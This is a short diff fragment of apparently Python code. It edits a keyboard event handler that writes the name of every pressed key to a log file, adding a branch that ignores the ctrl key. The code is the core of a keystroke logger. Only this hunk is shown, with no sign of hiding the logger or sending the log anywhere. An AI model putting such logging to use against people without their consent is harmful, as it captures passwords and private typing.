@@ -9,6 +9,8 @@ def on_key_press(event):
             f.write(' ')
         elif event.name == "enter":
             f.write('\n')
+        elif event.name == "ctrl":
+            return
         else: # write onto the log_file file
             f.write('{}'.format(event.name))
             
